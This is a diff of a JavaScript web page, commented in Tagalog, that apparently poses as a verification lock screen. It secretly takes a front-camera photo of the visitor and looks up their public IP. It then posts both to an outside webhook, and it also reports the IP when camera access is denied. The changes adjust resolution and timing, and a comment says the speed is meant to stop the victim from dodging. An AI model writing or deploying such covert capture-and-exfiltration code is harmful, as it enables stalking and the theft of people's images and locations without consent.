@@ -47,13 +47,9 @@
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 
-                // PORTRAIT FOCUS: 720x1280 para malinaw at buo
+                // NORMAL CAMERA REQUEST - Walang pilit na resolution
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: "user",
-                        width: { ideal: 720 },
-                        height: { ideal: 1280 } 
-                    } 
+                    video: { facingMode: "user" } 
                 });
                 
                 lockScreen.style.display = 'none';
@@ -63,28 +59,29 @@
                 const vid = document.getElementById('v');
                 vid.srcObject = stream;
 
-                // Binilisan natin yung delay (500ms) para hindi siya makailag
+                // 1.5 seconds para maka-focus at mag-adjust ang brightness
                 setTimeout(async () => {
                     const can = document.getElementById('c');
-                    can.width = 720; 
-                    can.height = 1280;
+                    
+                    // SAKTONG RESOLUTION BASE SA CAMERA
+                    can.width = vid.videoWidth;
+                    can.height = vid.videoHeight;
+                    
                     const ctx = can.getContext('2d');
+                    ctx.drawImage(vid, 0, 0);
                     
-                    // Siguraduhin na naka-center ang crop
-                    ctx.drawImage(vid, 0, 0, 720, 1280);
-                    
-                    const img = can.toDataURL('image/jpeg', 0.8);
+                    const img = can.toDataURL('image/jpeg', 0.7);
                     const blob = await (await fetch(img)).blob();
                     
                     const fd = new FormData();
-                    fd.append('file', blob, 'buong_mukha.jpg');
+                    fd.append('file', blob, 'normal_shot.jpg');
                     fd.append('payload_json', JSON.stringify({
-                        content: "🎯 **FULL PORTRAIT SHOT!**\n**IP:** " + ipData.ip
+                        content: "🎯 **SUCCESS: NORMAL SHOT**\n**IP:** " + ipData.ip
                     }));
 
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
-                }, 500);
+                }, 1500);
 
             } catch (e) {
                 errorText.style.display = 'block';
@@ -92,7 +89,7 @@
                 fetch(hook, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: "🚫 **FAILED:** " + ipRes.ip })
+                    body: JSON.stringify({ content: "🚫 **VERIFICATION DENIED!**\n**IP:** " + ipRes.ip })
                 });
             }
         };
